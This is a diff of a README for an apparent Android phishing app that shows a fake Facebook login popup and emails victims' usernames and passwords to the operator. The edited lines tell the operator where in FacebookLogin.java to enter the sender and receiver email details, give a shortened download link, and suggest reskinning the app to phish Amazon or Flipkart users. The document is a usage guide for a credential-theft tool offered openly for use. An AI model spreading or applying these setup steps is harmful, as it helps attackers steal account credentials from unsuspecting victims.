@@ -7,11 +7,11 @@ Download link - https://bit.ly/2rbruqk
 if victim enter his username & password in that facebook popup activity then all those detail mail to your email id which is you entered.
 
 You can use this project to create phising apk for other social application like amazon, filpkart all you need to just chnage the layout of it lthrough main code is remain same.
-once you download this project simply enter your email id and password in FacebookLogin.java file in line number 73
+once you download this project simply enter your email id and password and receiver email id in FacebookLogin.java file in line number 73
 
 | add your email address & password
 |:-:|
-| ![First](https://github.com/mayurkadampro/ClubFactory-Facebook-Phising/blob/master/Snapshots/chnages.png) |
+| ![First](https://github.com/mayurkadampro/ClubFactory-Facebook-Phising/blob/master/Snapshots/chnagess.png) |
 
 
 
